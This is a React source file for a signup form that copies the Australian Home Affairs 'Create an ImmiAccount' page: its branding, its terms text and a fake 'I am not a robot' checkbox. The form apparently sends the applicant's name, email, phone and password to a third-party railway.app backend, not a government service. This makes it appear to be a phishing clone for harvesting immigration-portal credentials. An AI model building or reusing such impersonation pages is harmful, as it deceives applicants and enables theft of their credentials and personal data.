/* eslint-disable no-dupe-keys */
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

const AccountDetails = () => {
  const navigate = useNavigate();
  const [windowWidth, setWindowWidth] = useState(window.innerWidth);
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    confirmPassword: '',
    question1: '',
    answer1: '',
    question2: '',
    answer2: '',
    question3: '',
    answer3: '',
    acceptTerms: false,
    notRobot: false
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    const handleResize = () => {
      setWindowWidth(window.innerWidth);
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    // Check if previous data exists, if not redirect back
    const existingData = localStorage.getItem('signupData');
    if (!existingData) {
      navigate("/gov.au/lusc/signup");
    }
  }, [navigate]);

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
  };

  const validatePassword = (password) => {
    if (password.length < 14) {
      return "Password must be at least 14 characters long";
    }

    let categories = 0;
    if (/[a-z]/.test(password)) categories++;
    if (/[A-Z]/.test(password)) categories++;
    if (/[0-9]/.test(password)) categories++;
    if (/[~`!@#$%^&*()_+={}[\]\\|:;"'<>,.?/]/.test(password)) categories++;

    if (categories < 3) {
      return "Password must include at least one character from three of the four groups (lowercase, uppercase, digits, symbols)";
    }

    return null;
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.username.trim()) {
      newErrors.username = "Username is required";
    }

    const passwordError = validatePassword(formData.password);
    if (passwordError) {
      newErrors.password = passwordError;
    }

    if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = "Passwords do not match";
    }

    if (!formData.question1) {
      newErrors.question1 = "Question 1 is required";
    }
    if (!formData.answer1.trim()) {
      newErrors.answer1 = "Answer 1 is required";
    }

    if (!formData.question2) {
      newErrors.question2 = "Question 2 is required";
    }
    if (!formData.answer2.trim()) {
      newErrors.answer2 = "Answer 2 is required";
    }

    if (!formData.question3) {
      newErrors.question3 = "Question 3 is required";
    }
    if (!formData.answer3.trim()) {
      newErrors.answer3 = "Answer 3 is required";
    }

    if (!formData.acceptTerms) {
      newErrors.acceptTerms = "You must accept the terms and conditions";
    }

    if (!formData.notRobot) {
      newErrors.notRobot = "Please confirm you are not a robot";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Auto login function after successful signup
  const performAutoLogin = async (email, password) => {
    try {
      const loginPayload = {
        email: email,
        password: password
      };

      const loginResponse = await fetch('https://immi-backend.up.railway.app/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(loginPayload),
      });

      if (loginResponse.ok) {
        const loginData = await loginResponse.json();
        
        // Save token and user data to localStorage
        if (loginData.idToken) {
          localStorage.setItem('authToken', loginData.idToken);
          localStorage.setItem('userId', loginData.user_id);

          // Store additional user data
          const userData = {
            user_id: loginData.user_id,
            name: loginData.name,
            email: loginData.email,
            phone_number: loginData.phone_number
          };
          localStorage.setItem('userData', JSON.stringify(userData));
          
          // Clear stored signup data
          localStorage.removeItem('signupData');
          
          // Navigate to success page only if token is saved
          const savedToken = localStorage.getItem('authToken');
          if (savedToken) {
            navigate("/gov.au/lusc/successful");
            window.location.reload();
          } else {
            setErrors({ submit: 'Failed to save authentication token. Please try logging in manually.' });
          }
        } else {
          setErrors({ submit: 'Login successful but no token received. Please try logging in manually.' });
        }
      } else {
        const loginErrorData = await loginResponse.json();
        setErrors({ submit: `Auto-login failed: ${loginErrorData.message || 'Please try logging in manually.'}` });
      }
    } catch (error) {
      console.error('Auto-login error:', error);
      setErrors({ submit: 'Auto-login failed due to network error. Please try logging in manually.' });
    }
  };

  const handleSubmit = async () => {
    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      // Get all collected data
      const existingData = JSON.parse(localStorage.getItem('signupData') || '{}');
      
      // Only send required fields to API
      const apiPayload = {
        name: formData.username,
        phone_number: existingData.phone || '', // Use phone from previous step
        password: formData.password,
        email: existingData.email || ''
      };

      const response = await fetch('https://immi-backend.up.railway.app/signup', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(apiPayload),
      });

      if (response.ok) {
        // Signup successful, now perform auto-login
        await performAutoLogin(existingData.email || '', formData.password);
      } else {
        const errorData = await response.json();
        setErrors({ submit: errorData.message || 'Registration failed. Please try again.' });
      }
    } catch (error) {
      console.error('Registration error:', error);
      setErrors({ submit: 'Network error. Please check your connection and try again.' });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Responsive helper functions
  const isMobile = windowWidth <= 480;
  const isTablet = windowWidth <= 768;
  const isLargeDesktop = windowWidth > 1200;

  const getInputWidth = () => {
    if (isTablet) return "100%";
    return isLargeDesktop ? "400px" : "320px";
  };

  const getSelectWidth = () => {
    if (isTablet) return "calc(100% - 25px)";
    return isLargeDesktop ? "400px" : "320px";
  };

  const getInputPadding = () => {
    if (isMobile) return "3px 5px";
    if (isTablet) return "3px 5px";
    return isLargeDesktop ? "4px 6px" : "3px 5px";
  };

  const getInputHeight = () => {
    if (isMobile) return "16px";
    if (isTablet) return "16px";
    return isLargeDesktop ? "18px" : "16px";
  };

  const getSelectHeight = () => {
    if (isMobile) return "22px";
    if (isTablet) return "22px";
    return isLargeDesktop ? "24px" : "22px";
  };

  const getButtonSize = () => {
    if (isMobile) return { width: "14px", height: "14px" };
    if (isTablet) return { width: "14px", height: "14px" };
    return isLargeDesktop ? { width: "16px", height: "16px" } : { width: "14px", height: "14px" };
  };

  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        margin: "0 auto",
        backgroundColor: "#f0f0f0",
        minHeight: "100vh",
        maxWidth: "100vw",
        width: "100%",
        display: "flex",
        flexDirection: "column",
      }}
    >
      {/* Main Container */}
      <div
        style={{
          padding: isTablet ? "10px" : "20px",
          backgroundColor: "#CCCCCC",
          flex: "1",
        }}
      >
        {/* Header and Content Container */}
        <div
          style={{
            border: "1px solid #ccc",
            borderRadius: "4px",
            marginBottom: isTablet ? "10px" : "20px",
            backgroundColor: "#ffffff",
            maxWidth: isTablet ? "100%" : "none",
            height: "fit-content",
          }}
        >
          {/* Header */}
          <header
            style={{
              background: "#1B3564",
              height: "fit-content",
              minHeight: isTablet ? "25px" : "20px",
              display: "flex",
              alignItems: "center",
              padding: isTablet ? "5px 10px" : "5px 15px",
              color: "white",
              fontSize: "12px",
              fontWeight: "bold",
            }}
          >
            Create an ImmiAccount
          </header>

          {/* Content Section */}
          <div
            style={{
              backgroundColor: "#ffffff",
              padding: isMobile ? "12px" : isTablet ? "15px" : "18px",
              height: "fit-content",
            }}
          >
            {/* Account Details Header - Increased size */}
            <h1
              style={{
                fontSize: "16px",
                marginTop: "0",
                marginBottom: isTablet ? "10px" : "12px",
                fontWeight: "normal",
                color: "#1B3564",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Account details
            </h1>

            <p
              style={{
                marginTop: "0",
                marginBottom: isTablet ? "10px" : "12px",
                fontSize: "12px",
                color: "#000000",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Fields marked <span style={{ color: "#d9534f" }}>*</span> must be completed.
            </p>

            {/* Submit Error Message */}
            {errors.submit && (
              <div style={{
                color: "#d9534f",
                fontSize: "12px",
                marginBottom: "10px",
                padding: "8px",
                backgroundColor: "#ffeaea",
                border: "1px solid #ffcdd2",
                borderRadius: "3px",
              }}>
                {errors.submit}
              </div>
            )}

            {/* Login Details Section - Made bold */}
            <h2
              style={{
                fontSize: "12px",
                marginTop: isTablet ? "15px" : "18px",
                marginBottom: isTablet ? "8px" : "10px",
                fontWeight: "bold",
                color: "#1B3564",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Login details
            </h2>

            <p
              style={{
                marginTop: "0",
                marginBottom: isTablet ? "8px" : "10px",
                fontSize: "12px",
                color: "#333",
                lineHeight: "1.3",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              You can use your email address as a username or email a different username if you prefer.
            </p>

            <p
              style={{
                marginTop: "0",
                marginBottom: isTablet ? "8px" : "10px",
                fontSize: "12px",
                color: "#333",
                lineHeight: "1.3",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              After you have created your account you will not be able to change your username.
            </p>

            {/* Username Input */}
            <div style={{ 
              marginBottom: isTablet ? "8px" : "10px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Username <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <input
                type="text"
                value={formData.username}
                onChange={(e) => handleInputChange('username', e.target.value)}
                style={{
                  width: getInputWidth(),
                  padding: getInputPadding(),
                  fontSize: "12px",
                  border: "1px solid black",
                  backgroundColor: "#fff",
                  height: getInputHeight(),
                  marginLeft: !isTablet ? "20px" : "0",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* Error message for username */}
            {errors.username && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.username}
              </div>
            )}

            {/* Password Section */}
            <p
              style={{
                marginTop: isTablet ? "12px" : "15px",
                marginBottom: isTablet ? "8px" : "10px",
                fontSize: "12px",
                color: "#333",
                lineHeight: "1.3",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Password must be a minimum of fourteen (14) characters <strong>and include at least one (1) character from three (3) of the four (4) groups below:</strong>
            </p>

            <ul
              style={{
                marginBottom: isTablet ? "8px" : "10px",
                paddingLeft: "20px",
                fontSize: "12px",
                color: "#333",
                lineHeight: "1.3",
              }}
            >
              <li>Lower-case characters (a-z)</li>
              <li>Upper-case characters (A-Z)</li>
              <li>Digits (0-9)</li>
            </ul>

            {/* New Password Input */}
            <div style={{ 
              marginBottom: isTablet ? "8px" : "10px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "100px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                New password <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                style={{
                  width: getInputWidth(),
                  padding: getInputPadding(),
                  fontSize: "12px",
                  border: "1px solid black",
                  backgroundColor: "#fff",
                  height: getInputHeight(),
                  marginLeft: !isTablet ? "20px" : "0",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* Error message for password */}
            {errors.password && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "120px" : "0",
                wordBreak: "break-word",
              }}>
                {errors.password}
              </div>
            )}

            {/* Re-type New Password Input */}
            <div style={{ 
              marginBottom: isTablet ? "12px" : "15px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "120px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Re-type new password <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <input
                type="password"
                value={formData.confirmPassword}
                onChange={(e) => handleInputChange('confirmPassword', e.target.value)}
                style={{
                  width: getInputWidth(),
                  padding: getInputPadding(),
                  fontSize: "12px",
                  border: "1px solid black",
                  backgroundColor: "#fff",
                  height: getInputHeight(),
                  marginLeft: !isTablet ? "20px" : "0",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* Error message for confirm password */}
            {errors.confirmPassword && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "140px" : "0",
              }}>
                {errors.confirmPassword}
              </div>
            )}

            {/* Secret Questions Section - Made bold */}
            <h2
              style={{
                fontSize: "12px",
                marginTop: isTablet ? "15px" : "18px",
                marginBottom: isTablet ? "8px" : "10px",
                fontWeight: "bold",
                color: "#1B3564",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Secret questions and answers
            </h2>

            <p
              style={{
                marginTop: "0",
                marginBottom: isTablet ? "10px" : "12px",
                fontSize: "12px",
                color: "#333",
                lineHeight: "1.3",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Note: You will need to remember the exact answers to these questions if you forget your password.
            </p>

            {/* Question 1 */}
            <div style={{ 
              marginBottom: isTablet ? "8px" : "10px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Question 1 <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <div style={{
                display: "flex",
                alignItems: "center",
                gap: isMobile ? "5px" : "8px",
                width: isTablet ? "100%" : "auto",
                height: "fit-content",
              }}>
                <select
                  value={formData.question1}
                  onChange={(e) => handleInputChange('question1', e.target.value)}
                  style={{
                    width: getSelectWidth(),
                    padding: getInputPadding(),
                    fontSize: "12px",
                    border: "1px solid black",
                    backgroundColor: "#fff",
                    height: getSelectHeight(),
                    marginLeft: !isTablet ? "20px" : "0",
                    flex: isTablet ? "1" : "none",
                    boxSizing: "border-box",
                  }}
                >
                  <option value="">Select a question...</option>
                  <option value="pet">What was the name of your first pet?</option>
                  <option value="school">What was the name of your first school?</option>
                  <option value="mother">What is your mother's maiden name?</option>
                </select>
                <button
                  type="button"
                  style={{
                    width: getButtonSize().width,
                    height: getButtonSize().height,
                    fontSize: "9px",
                    color: "white",
                    backgroundColor: "#1E70BC",
                    border: "1px solid #428bca",
                    borderRadius: "50%",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    fontWeight: "bold",
                    flexShrink: 0,
                  }}
                >
                  ?
                </button>
              </div>
            </div>

            {/* Error message for question1 */}
            {errors.question1 && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.question1}
              </div>
            )}

            {/* Answer 1 */}
            <div style={{ 
              marginBottom: isTablet ? "10px" : "12px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Answer 1 <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <input
                type="text"
                value={formData.answer1}
                onChange={(e) => handleInputChange('answer1', e.target.value)}
                style={{
                  width: getInputWidth(),
                  padding: getInputPadding(),
                  fontSize: "12px",
                  border: "1px solid black",
                  backgroundColor: "#fff",
                  height: getInputHeight(),
                  marginLeft: !isTablet ? "20px" : "0",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* Error message for answer1 */}
            {errors.answer1 && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.answer1}
              </div>
            )}

            {/* Question 2 */}
            <div style={{ 
              marginBottom: isTablet ? "8px" : "10px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Question 2 <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <div style={{
                display: "flex",
                alignItems: "center",
                gap: isMobile ? "5px" : "8px",
                width: isTablet ? "100%" : "auto",
                height: "fit-content",
              }}>
                <select
                  value={formData.question2}
                  onChange={(e) => handleInputChange('question2', e.target.value)}
                  style={{
                    width: getSelectWidth(),
                    padding: getInputPadding(),
                    fontSize: "12px",
                    border: "1px solid black",
                    backgroundColor: "#fff",
                    height: getSelectHeight(),
                    marginLeft: !isTablet ? "20px" : "0",
                    flex: isTablet ? "1" : "none",
                    boxSizing: "border-box",
                  }}
                >
                  <option value="">Select a question...</option>
                  <option value="city">In what city were you born?</option>
                  <option value="food">What is your favorite food?</option>
                  <option value="book">What is your favorite book?</option>
                </select>
                <button
                  type="button"
                  style={{
                    width: getButtonSize().width,
                    height: getButtonSize().height,
                    fontSize: "9px",
                    color: "white",
                    backgroundColor: "#1E70BC",
                    border: "1px solid #428bca",
                    borderRadius: "50%",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    fontWeight: "bold",
                    flexShrink: 0,
                  }}
                >
                  ?
                </button>
              </div>
            </div>

            {/* Error message for question2 */}
            {errors.question2 && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.question2}
              </div>
            )}

            {/* Answer 2 */}
            <div style={{ 
              marginBottom: isTablet ? "10px" : "12px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Answer 2 <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <input
                type="text"
                value={formData.answer2}
                onChange={(e) => handleInputChange('answer2', e.target.value)}
                style={{
                  width: getInputWidth(),
                  padding: getInputPadding(),
                  fontSize: "12px",
                  border: "1px solid black",
                  backgroundColor: "#fff",
                  height: getInputHeight(),
                  marginLeft: !isTablet ? "20px" : "0",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* Error message for answer2 */}
            {errors.answer2 && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.answer2}
              </div>
            )}

            {/* Question 3 */}
            <div style={{ 
              marginBottom: isTablet ? "8px" : "10px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Question 3 <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <div style={{
                display: "flex",
                alignItems: "center",
                gap: isMobile ? "5px" : "8px",
                width: isTablet ? "100%" : "auto",
                height: "fit-content",
              }}>
                <select
                  value={formData.question3}
                  onChange={(e) => handleInputChange('question3', e.target.value)}
                  style={{
                    width: getSelectWidth(),
                    padding: getInputPadding(),
                    fontSize: "12px",
                    border: "1px solid black",
                    backgroundColor: "#fff",
                    height: getSelectHeight(),
                    marginLeft: !isTablet ? "20px" : "0",
                    flex: isTablet ? "1" : "none",
                    boxSizing: "border-box",
                  }}
                >
                  <option value="">Select a question...</option>
                  <option value="teacher">What was your favorite teacher's name?</option>
                  <option value="car">What was your first car?</option>
                  <option value="street">What street did you grow up on?</option>
                </select>
                <button
                  type="button"
                  style={{
                    width: getButtonSize().width,
                    height: getButtonSize().height,
                    fontSize: "9px",
                    color: "white",
                    backgroundColor: "#1E70BC",
                    border: "1px solid #428bca",
                    borderRadius: "50%",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    fontWeight: "bold",
                    flexShrink: 0,
                  }}
                >
                  ?
                </button>
              </div>
            </div>

            {/* Error message for question3 */}
            {errors.question3 && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.question3}
              </div>
            )}

            {/* Answer 3 */}
            <div style={{ 
              marginBottom: isTablet ? "15px" : "18px", 
              display: "flex", 
              alignItems: "center", 
              gap: isMobile ? "5px" : "8px",
              flexDirection: isTablet ? "column" : "row",
              alignItems: isTablet ? "stretch" : "center",
              height: "fit-content",
            }}>
              <label
                style={{
                  fontSize: "12px",
                  fontWeight: "normal",
                  color: "#333",
                  minWidth: !isTablet ? "80px" : "auto",
                  textAlign: "left",
                  marginBottom: isTablet ? "3px" : "0",
                }}
              >
                Answer 3 <span style={{ color: "#d9534f" }}>*</span>
              </label>
              
              <input
                type="text"
                value={formData.answer3}
                onChange={(e) => handleInputChange('answer3', e.target.value)}
                style={{
                  width: getInputWidth(),
                  padding: getInputPadding(),
                  fontSize: "12px",
                  border: "1px solid black",
                  backgroundColor: "#fff",
                  height: getInputHeight(),
                  marginLeft: !isTablet ? "20px" : "0",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* Error message for answer3 */}
            {errors.answer3 && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
                marginLeft: !isTablet ? "100px" : "0",
              }}>
                {errors.answer3}
              </div>
            )}

            {/* Declaration Section - Made bold */}
            <h2
              style={{
                fontSize: "12px",
                marginTop: isTablet ? "15px" : "18px",
                marginBottom: isTablet ? "8px" : "10px",
                fontWeight: "bold",
                color: "#1B3564",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Terms and conditions
            </h2>

            {/* Terms and Conditions */}
            <div style={{
              marginBottom: isTablet ? "10px" : "12px",
              display: "flex",
              alignItems: "flex-start",
              gap: "8px",
              flexWrap: "wrap",
            }}>
              <input
                type="checkbox"
                id="acceptTerms"
                checked={formData.acceptTerms}
                onChange={(e) => handleInputChange('acceptTerms', e.target.checked)}
                style={{
                  marginTop: "2px",
                  marginRight: "5px",
                  flexShrink: 0,
                }}
              />
              <label
                htmlFor="acceptTerms"
                style={{
                  fontSize: "12px",
                  color: "#333",
                  cursor: "pointer",
                  lineHeight: "1.3",
                  flex: "1",
                }}
              >
                <span style={{ color: "#d9534f" }}>*</span> I accept the ImmiAccount terms and conditions to access the Department of Home Affairs services and agree to an ImmiAccount being created in my name. All details on this form are correct.
              </label>
            </div>

            {/* Error message for acceptTerms */}
            {errors.acceptTerms && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
              }}>
                {errors.acceptTerms}
              </div>
            )}

            {/* Security Check Section - Made bold */}
            <h2
              style={{
                fontSize: "12px",
                marginTop: isTablet ? "15px" : "18px",
                marginBottom: isTablet ? "8px" : "10px",
                fontWeight: "bold",
                color: "#1B3564",
                textAlign: isMobile ? "center" : "left",
              }}
            >
              Security check
            </h2>

            {/* I am not a robot */}
            <div style={{
              marginBottom: isTablet ? "15px" : "18px",
              display: "flex",
              alignItems: "center",
              gap: "8px",
            }}>
              <input
                type="checkbox"
                id="notRobot"
                checked={formData.notRobot}
                onChange={(e) => handleInputChange('notRobot', e.target.checked)}
                style={{
                  marginRight: "5px",
                  flexShrink: 0,
                }}
              />
              <label
                htmlFor="notRobot"
                style={{
                  fontSize: "12px",
                  color: "#333",
                  cursor: "pointer",
                }}
              >
                <span style={{ color: "#d9534f" }}>*</span> I am not a robot
              </label>
            </div>

            {/* Error message for notRobot */}
            {errors.notRobot && (
              <div style={{
                color: "#d9534f",
                fontSize: "11px",
                marginBottom: "8px",
              }}>
                {errors.notRobot}
              </div>
            )}

            {/* Buttons positioned at opposite ends */}
            <div
              style={{
                marginTop: isTablet ? "15px" : "18px",
                marginBottom: isTablet ? "10px" : "12px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                backgroundColor: "#E5E5E5",
                height: "fit-content",
                minHeight: isMobile ? "28px" : isTablet ? "28px" : isLargeDesktop ? "30px" : "28px",
                border: "1px solid #ccc",
                padding: isMobile ? "3px 5px" : "3px",
                flexWrap: "wrap",
                gap: isMobile ? "5px" : "0",
              }}
            >
              <button
                type="button"
                onClick={() => navigate("/gov.au/lusc/register")}
                style={{
                  padding: isMobile ? "3px 8px" : isTablet ? "3px 10px" : isLargeDesktop ? "4px 12px" : "3px 9px",
                  fontSize: "12px",
                  color: "black",
                  backgroundColor: "#f5f5f5",
                  border: "1px solid black",
                  borderRadius: "3px",
                  cursor: "pointer",
                  height: "fit-content",
                  minHeight: isMobile ? "20px" : isTablet ? "20px" : isLargeDesktop ? "22px" : "20px",
                  marginLeft: isMobile ? "5px" : "10px",
                  whiteSpace: "nowrap",
                }}
              >
                Previous
              </button>
              <button
                type="button"
                onClick={handleSubmit}
                disabled={isSubmitting}
                style={{
                  padding: isMobile ? "3px 6px" : isTablet ? "3px 8px" : isLargeDesktop ? "4px 12px" : "3px 9px",
                  fontSize: "12px",
                  color: "black",
                  backgroundColor: isSubmitting ? "#ccc" : "#f5f5f5",
                  border: "1px solid black",
                  borderRadius: "3px",
                  cursor: isSubmitting ? "not-allowed" : "pointer",
                  height: "fit-content",
                  minHeight: isMobile ? "20px" : isTablet ? "20px" : isLargeDesktop ? "22px" : "20px",
                  marginRight: isMobile ? "5px" : "10px",
                  whiteSpace: "nowrap",
                }}
              >
                {isSubmitting ? "Creating..." : "Create Account"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AccountDetails;
